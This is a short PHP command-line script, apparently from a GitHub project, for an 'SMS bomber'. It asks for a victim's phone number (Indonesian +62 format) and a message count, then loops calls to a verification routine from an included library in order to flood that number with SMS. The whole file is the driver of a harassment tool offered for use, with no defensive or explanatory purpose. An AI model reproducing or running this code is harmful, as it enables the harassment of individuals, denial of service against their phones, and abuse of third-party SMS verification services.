<?php
include 'bomphd.php';

/*
    https://github.com/nee48/BomSmsPhD
    Made by Handika Pratama
    Modified by Lingga Ganteng
*/

$init = new Bom();

//Eksekusi Sms Boomber
echo "</> Number Victims (Usee 62) : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
echo "</> Number Of Message : ";
$b = trim(fgets(STDIN));
$loop = "$b";
for ($i=0; $i < $loop; $i++) {
    $init->Verif($init->no);
}
